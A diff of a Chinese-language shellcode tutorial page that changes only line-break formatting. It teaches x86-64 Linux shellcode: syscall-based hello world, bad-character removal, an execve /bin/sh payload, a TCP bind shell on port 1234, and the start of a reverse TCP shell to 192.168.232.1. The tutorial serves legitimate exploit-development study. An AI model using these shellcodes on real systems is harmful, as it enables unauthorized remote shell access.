@@ -7751,13 +7751,13 @@
   <h1>Linux下Shellcode编写</h1>
 
 <h2 id="linuxshellcode">Linux下Shellcode编写</h2>
-<p>学习自：<a href="https://wwi.lanzouo.com/iUoDNya89of">《Penetration Testing with Shellcode》</a>
+<p>学习自：<a href="https://wwi.lanzouo.com/iUoDNya89of">《Penetration Testing with Shellcode》</a><br />
 基本过程是首先使用汇编通过系统调用的方式实现程序功能，编译成可执行文件，然后使用 objdump 进行机器码提取</p>
-<p>先看一个汇编通过系统调用写 Hello World 的例子
+<p>先看一个汇编通过系统调用写 Hello World 的例子<br />
 要输出一个 hello world，可以通过 write 函数来实现，通过下面的方法查找 write 函数的系统调用号</p>
 <h2 id="_1">找系统调用号</h2>
-<p>我用的 ubuntu 16.04 是这俩文件（找出来的是十进制的）
-<code>cat /usr/include/asm/unistd_32.h | grep write</code>
+<p>我用的 ubuntu 16.04 是这俩文件（找出来的是十进制的）<br />
+<code>cat /usr/include/asm/unistd_32.h | grep write</code><br />
 <code>cat /usr/include/asm/unistd_64.h | grep write</code></p>
 <pre><code>yichen@ubuntu:~$ cat /usr/include/asm/unistd_64.h | grep write
 #define __NR_write 1
@@ -7768,7 +7768,7 @@
 </code></pre>
 <p>rax 是存放系统调用号的，这里就应该是 1</p>
 <h2 id="_2">编写汇编程序</h2>
-<p>使用 <code>man 2 write</code> 可以找到 write 函数的参数
+<p>使用 <code>man 2 write</code> 可以找到 write 函数的参数<br />
 <code>ssize_t write(int fd, const void *buf, size_t count);</code></p>
 <p>第一个参数是三种输出模式</p>
 <table>
@@ -7792,8 +7792,8 @@
 </tr>
 </tbody>
 </table>
-<p>第二个参数是字符串的指针，第三个参数是输出的字数
-而 64 位的程序，寄存器传参：rdi, rsi, rdx, rcx, r8, r9 剩下的才用栈
+<p>第二个参数是字符串的指针，第三个参数是输出的字数<br />
+而 64 位的程序，寄存器传参：rdi, rsi, rdx, rcx, r8, r9 剩下的才用栈<br />
 所以 rdi 应该是 1，rsi 应该是字符串的地址，rdx 应该是长度</p>
 <pre><code>global _start
 section .text
@@ -7807,7 +7807,7 @@ section .data
    hello_world: db 'hello world',0xa       ;字符串hello world以及换行
    length: equ $-hello_world               ;获取字符串长度
 </code></pre>
-<p>把代码保存为 hello-world.asm 然后汇编、链接
+<p>把代码保存为 hello-world.asm 然后汇编、链接<br />
 应该会这样显示：</p>
 <pre><code>yichen@ubuntu:~$ nasm -felf64 hello-world.asm -o hello-world.o
 yichen@ubuntu:~$ ld hello-world.o -o hello-world
@@ -7892,7 +7892,7 @@ Disassembly of section .text:
   4000d0:   bf 00 00 00 00          mov    edi,0x0
   4000d5:   0f 05                   syscall 
 </code></pre>
-<p>针对这种的 <code>mov eax,0x1</code>，可以使用对寄存器的一部分赋值实现，比如：<code>mov al,0x1</code>
+<p>针对这种的 <code>mov eax,0x1</code>，可以使用对寄存器的一部分赋值实现，比如：<code>mov al,0x1</code><br />
 还可以通过 <code>xor rax,rax</code> 先把 rax 置为 0，然后 <code>add rax,0x1</code> 实现</p>
 <p>看一下效果：5、6、7 行已经没有 bad character 了</p>
 <pre><code>yichen@ubuntu:~$ objdump -d -M intel hello-world
@@ -7989,35 +7989,35 @@ _start:
     syscall
 </code></pre>
 <h2 id="execveshell">用execve写个shell</h2>
-<p>学会了这些基本的消除 bad character 的方法之后来写个真正的 shellcode 试试
-:::success
-64 位，寄存器传参：rdi, rsi, rdx, rcx, r8, r9 剩下的才用栈
+<p>学会了这些基本的消除 bad character 的方法之后来写个真正的 shellcode 试试<br />
+:::success<br />
+64 位，寄存器传参：rdi, rsi, rdx, rcx, r8, r9 剩下的才用栈<br />
 :::</p>
 <p>一个可以获得 shell 的 C 语言代码如下</p>
 <pre><code class="language-c">char *const argv[]={&quot;/bin/sh&quot;,NULL};
 execve(&quot;/bin/sh&quot;,argv,NULL);
 </code></pre>
 <p>不知道为啥，之前学 pwn 的时候只需要第一个参数就可以了，但是这里要两个呜呜呜</p>
-<p>想办法放到对应的寄存器就行
+<p>想办法放到对应的寄存器就行<br />
 /bin/sh 参数用 python 生成逆序的十六进制，这里多加一个 / 用来占空，防止出现 0x00</p>
 <pre><code>&gt;&gt;&gt; string = &quot;//bin/sh&quot;
 &gt;&gt;&gt; string[::-1].encode('hex')
 '68732f6e69622f2f'
 </code></pre>
-<p>一开始往栈上压入一个 0x00，用来截断 /bin/sh，顺便把第三个参数 rdx 的 NULL 设置好
-<code>xor rax,rax</code>
-<code>push rax</code>
-<code>mov rdx,rsp</code>
-用 stack technique 把这个参数压到栈上，然后给 rsp 这样就设置好了第一个参数
-<code>mov rbx,0x68732f6e69622f2f</code>
-<code>push rbx</code>
-<code>mov rdi,rsp</code>
-第二个参数是一个指针，所以把 rdi 压栈，获取到指针
-<code>push rax</code>        ;这里再次 push 的 rax 作为截断
-<code>push rdi</code>
-<code>mov rsi,rsp</code>
-以及系统调用号是 59，最后加一个 syscall
-<code>add rax,59</code>
+<p>一开始往栈上压入一个 0x00，用来截断 /bin/sh，顺便把第三个参数 rdx 的 NULL 设置好<br />
+<code>xor rax,rax</code><br />
+<code>push rax</code><br />
+<code>mov rdx,rsp</code><br />
+用 stack technique 把这个参数压到栈上，然后给 rsp 这样就设置好了第一个参数<br />
+<code>mov rbx,0x68732f6e69622f2f</code><br />
+<code>push rbx</code><br />
+<code>mov rdi,rsp</code><br />
+第二个参数是一个指针，所以把 rdi 压栈，获取到指针<br />
+<code>push rax</code>        ;这里再次 push 的 rax 作为截断<br />
+<code>push rdi</code><br />
+<code>mov rsi,rsp</code><br />
+以及系统调用号是 59，最后加一个 syscall<br />
+<code>add rax,59</code><br />
 <code>syscall</code></p>
 <p>把提取的 shellcode 放到上面的代码中编译，可以使用，漂亮！~</p>
 <pre><code>yichen@ubuntu:~$ gcc -z execstack -o test 1.c
@@ -8027,7 +8027,7 @@ $ whoami
 yichen
 </code></pre>
 <h2 id="tcp-bind-shell">TCP bind shell</h2>
-<p>靶机开启一个端口监听，等待我们去连接，这样的方式容易被防火墙阻断和记录
+<p>靶机开启一个端口监听，等待我们去连接，这样的方式容易被防火墙阻断和记录<br />
 C 语言代码如下：</p>
 <pre><code class="language-c">#include &lt;sys/socket.h&gt;
 #include &lt;sys/types.h&gt;
@@ -8054,8 +8054,8 @@ int main(void)
  return 0;
 }
 </code></pre>
-<p>接下来使用 syscall 依次实现这个程序
-sockfd = socket(AF_INET, SOCK_STREAM, 0);
+<p>接下来使用 syscall 依次实现这个程序<br />
+sockfd = socket(AF_INET, SOCK_STREAM, 0);<br />
 查找 socket 的系统调用号是 41</p>
 <pre><code class="language-c">xor rax,rax
 add rax,41
@@ -8066,7 +8066,7 @@ inc rsi        ;SOCK_STREAM用1表示
 xor rdx,rdx    ;第三个参数为0
 syscall
 </code></pre>
-<p>函数调用返回值保存在 RAX 寄存器，bind 函数用 sockfd 做参数，可以直接用<code>mov rdi,rax</code>
+<p>函数调用返回值保存在 RAX 寄存器，bind 函数用 sockfd 做参数，可以直接用<code>mov rdi,rax</code><br />
 接下来填充 bind 函数的第二个参数 mysockaddr 结构体，因为后面 bind 调用的时候用的是指针，所以可以压到栈上去，然后拿到指针。应该怎么填充？可以使用 GDB 调试看一下 C 语言程序内存的值（gcc 加上 <code>-g</code> 参数可以直接 <code>b 15</code> 断在代码的第 15 行）</p>
 <pre><code>Breakpoint 1, main () at 1.c:15
 15   bind(sockfd, (struct sockaddr *) &amp;mysockaddr, sizeof(mysockaddr));
@@ -8218,7 +8218,7 @@ _start:
 </code></pre>
 <p>提取处 shellcode 后放到上面的<a href="#rliol">使用 shellcode</a> 的模板上，编译好运行，通过 netstat -ntlp 可以看到 1234 端口开放，然后 <code>nc 127.0.0.1 1234</code> 就可以获得 shell 了</p>
 <h2 id="reverse-tcp-shell">Reverse TCP shell</h2>
-<p>这种方法是我们首先在自己的机器上监听一个端口，然后让靶机访问我们，这样不会被防火墙拦截。
+<p>这种方法是我们首先在自己的机器上监听一个端口，然后让靶机访问我们，这样不会被防火墙拦截。<br />
 先看看 C 语言的代码</p>
 <pre><code>#include &lt;sys/socket.h&gt;
 #include &lt;sys/types.h&gt;
@@ -8254,7 +8254,7 @@ inc rsi        ;SOCK_STREAM用1表示
 xor rdx, rdx    ;第三个参数为0
 syscall
 </code></pre>
-<p>填充 mysockaddr 结构体
+<p>填充 mysockaddr 结构体<br />
 IP 地址的十六进制形式这样获得</p>
 <pre><code>&gt;&gt;&gt; import socket
 &gt;&gt;&gt; socket.inet_aton('192.168.232.1')[::-1]
